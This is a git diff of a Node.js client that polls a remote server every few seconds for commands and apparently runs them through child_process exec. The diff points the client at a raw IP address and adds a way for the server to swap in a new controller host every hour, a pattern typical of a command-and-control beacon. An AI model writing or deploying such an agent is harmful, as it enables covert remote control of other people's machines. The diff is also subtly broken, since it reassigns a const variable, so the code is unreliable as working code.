@@ -1,8 +1,19 @@
 const request = require('request');
 const exec = require('child_process').exec;
 const build_in = require('./build_in');
+const fs = require('fs');
 
-const host = 'http://andreamapp.com:81';
+const host = 'http://45.32.41.191:81';
+const name = 'pc';
+
+function initHost() {
+    if(fs.existsSync('host')) {
+        host = fs.readFileSync('host');
+    }
+    else {
+        fs.writeFileSync('host', host);
+    }
+}
 
 function get(url, callback){
     request.get({
@@ -20,7 +31,7 @@ function telcmd(cmd, name){
 }
 
 // change name to your client name
-function flush(name = 'pc'){
+function flush(){
     console.log('~');
     get(host + '/flush?name=' + name, async function (error, response, buf) {
         if(!buf) return;
@@ -50,12 +61,25 @@ function flush(name = 'pc'){
     });
 }
 
+function resetHost() {
+    get(host + '/host', async function (error, response, buf) {
+        if(!buf) return;
+        let newHost = new Buffer(buf).toString();
+        if(newHost != host) {
+            host = newHost;
+            fs.writeFileSync('host', host);
+        }
+    });
+}
+
 function deamon(){
     setImmediate(flush);
     setInterval(flush, 3000);
+    setInterval(resetHost, 60 * 60 * 1000);
 }
 
 if (require.main === module) {
+    initHost();
     deamon();
 }
 
